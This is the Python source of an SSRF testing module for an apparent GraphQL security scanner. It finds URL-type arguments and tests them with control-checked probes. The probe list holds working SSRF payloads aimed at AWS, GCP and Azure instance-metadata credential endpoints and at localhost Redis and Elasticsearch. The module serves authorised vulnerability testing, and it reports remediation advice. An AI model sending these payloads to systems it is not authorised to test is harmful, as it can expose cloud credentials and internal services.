"""
SSRF Module
Tests URL-accepting GraphQL arguments for Server-Side Request Forgery.

To avoid the false positives that come from matching generic substrings (a
field literally named "token", the word "server" in any HTML), each probe only
matches DISTINCTIVE response signatures, and every hit is confirmed against a
benign control URL: the signature must appear for the internal target and NOT
for the control. Cloud-metadata hits are reported confirmed; loopback service
hits, which are easier to trigger spuriously, are tentative.
"""

from __future__ import annotations

import asyncio
from typing import Literal, TypedDict

from gqlx.core.requester import Requester, RequestError
from gqlx.modules.base import BaseModule, ModuleMetadata
from gqlx.utils.helpers import truncate
from gqlx.utils.logger import get_logger
from gqlx.utils.models import Finding, GraphQLField, RunContext

logger = get_logger(__name__)

# A URL that should never resolve to anything meaningful — control baseline.
_CONTROL_URL = "http://gqlx-control.invalid/"


# Probe URLs with DISTINCTIVE evidence signatures only. Generic tokens such as
# "server", "html", "token", "redis" are deliberately excluded.
class _SsrfProbe(TypedDict):
    url: str
    label: str
    hints: list[str]
    severity: Literal["critical", "high"]
    confidence: Literal["confirmed", "tentative"]


_SSRF_PROBES: list[_SsrfProbe] = [
    {
        "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "label": "AWS IMDS",
        "hints": ["ami-id", "instance-id", "security-credentials", "AccessKeyId"],
        "severity": "critical",
        "confidence": "confirmed",
    },
    {
        "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
        "label": "GCP Metadata",
        "hints": ["service-accounts/", "computeMetadata", "default/token"],
        "severity": "critical",
        "confidence": "confirmed",
    },
    {
        "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "label": "Azure IMDS",
        "hints": ["subscriptionId", "resourceGroupName", "vmId"],
        "severity": "critical",
        "confidence": "confirmed",
    },
    {
        "url": "http://127.0.0.1:9200/",
        "label": "Elasticsearch on localhost",
        "hints": ["cluster_name", "You Know, for Search", "lucene_version"],
        "severity": "high",
        "confidence": "tentative",
    },
    {
        "url": "http://127.0.0.1:6379/",
        "label": "Redis on localhost",
        "hints": ["-ERR unknown command", "redis_version", "-DENIED"],
        "severity": "high",
        "confidence": "tentative",
    },
]

_URL_ARG_PATTERNS = {
    "url",
    "uri",
    "endpoint",
    "link",
    "href",
    "src",
    "source",
    "webhook",
    "callback",
    "redirect",
    "target",
    "proxy",
    "fetch",
    "request",
    "host",
    "address",
}


def _arg_looks_like_url(name: str) -> bool:
    return name.lower() in _URL_ARG_PATTERNS or "url" in name.lower() or "uri" in name.lower()


class SsrfModule(BaseModule):
    """Tests GraphQL fields with URL-type arguments for Server-Side Request Forgery."""

    metadata = ModuleMetadata(
        name="ssrf",
        description="Tests URL arguments for SSRF via cloud metadata and localhost probes",
        references=[
            "https://owasp.org/www-project-top-ten/",
            "https://portswigger.net/web-security/ssrf",
            "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
        ],
    )

    async def run(self, ctx: RunContext) -> list[Finding]:
        if not ctx.schema:
            return []

        targets: list[tuple[GraphQLField, str]] = []
        seen: set[tuple[str, str]] = set()
        for field in ctx.schema.url_fields() + ctx.schema.injectable_fields():
            for arg in field.args:
                if _arg_looks_like_url(arg.name) and (field.name, arg.name) not in seen:
                    seen.add((field.name, arg.name))
                    targets.append((field, arg.name))

        if not targets:
            logger.info("ssrf_no_url_args")
            return []

        logger.info("ssrf_targets", count=len(targets))
        nested = await asyncio.gather(
            *(self._probe_arg(ctx, field, arg_name) for field, arg_name in targets)
        )
        return [f for batch in nested for f in batch]

    async def _probe_arg(
        self, ctx: RunContext, field: GraphQLField, arg_name: str
    ) -> list[Finding]:
        req = ctx.requester
        selection = ctx.schema.build_selection(field) if ctx.schema else ""
        findings: list[Finding] = []

        control_body = (
            await self._fetch(req, ctx.url, field.name, arg_name, _CONTROL_URL, selection)
        ) or ""

        for probe in _SSRF_PROBES:
            body = await self._fetch(req, ctx.url, field.name, arg_name, probe["url"], selection)
            if not body:
                continue
            matched = self._distinctive_hit(body, control_body, probe["hints"])
            if matched:
                findings.append(
                    self.finding(
                        title=f"SSRF — {field.name}.{arg_name} ({probe['label']})",
                        severity=probe["severity"],
                        confidence=probe["confidence"],
                        description=(
                            f"The argument '{arg_name}' on field '{field.name}' causes the "
                            f"server to fetch an attacker-supplied URL. A probe targeting "
                            f"{probe['label']} returned the signature '{matched}', which was "
                            f"absent from a benign control request — indicating the internal "
                            f"resource was actually reached."
                        ),
                        endpoint=ctx.url,
                        payload=probe["url"],
                        evidence=f"Signature '{matched}' present. Response: {truncate(body, 400)}",
                        remediation=(
                            "Validate URL arguments against an allowlist of permitted hosts "
                            "and schemes. Block RFC-1918, link-local (169.254.0.0/16), and "
                            "loopback addresses. Route outbound fetches through an egress "
                            "proxy with network-level controls."
                        ),
                    )
                )
                break  # one finding per (field, arg) is enough

        return findings

    @staticmethod
    def _distinctive_hit(body: str, control_body: str, hints: list[str]) -> str | None:
        """Return the matched hint only if it is in the probe body but not the control."""
        bl, cl = body.lower(), control_body.lower()
        for hint in hints:
            h = hint.lower()
            if h in bl and h not in cl:
                return hint
        return None

    async def _fetch(
        self, req: Requester, url: str, field: str, arg: str, value: str, selection: str
    ) -> str | None:
        escaped = value.replace('"', '\\"')
        query = f'{{ {field}({arg}: "{escaped}"){selection} }}'
        try:
            resp = await req.graphql(query, url=url)
            return resp.text
        except (RequestError, AttributeError):
            return None
